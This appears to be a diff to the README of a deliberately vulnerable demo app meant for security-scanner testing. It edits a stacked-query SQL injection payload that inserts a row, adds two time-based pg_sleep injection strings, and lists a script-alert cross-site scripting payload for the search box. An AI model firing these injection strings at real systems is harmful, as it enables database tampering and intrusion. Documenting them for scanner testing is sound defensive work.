@@ -36,5 +36,7 @@ docker-compose up --build -d
 
 A [ZAP]((https://www.zaproxy.org/) or [StackHawk](https://www.stackhawk.com/login) scan should uncover these two nast bugs:
 
-* SQL Injection via search box. - `a%'; insert into item values (999, 'bad bad description', 'hacker item name'); select * from item where name like  '%banan`
+* SQL Injection via search box. - `a%'; insert into item values ((select max(id)+1 from item), 'bad bad description', 'hacker item name'); select * from item where name like  '%banan`
+  ' union select case when cast(pg_sleep(5) as varchar) > '' then 0 else 1 end, '1', '1'--
+  ' union select 1, cast(pg_sleep(5) as varchar), '1'--
 * Cross Site Scripting via search box. - `<script>alert('hey guy');</script>`
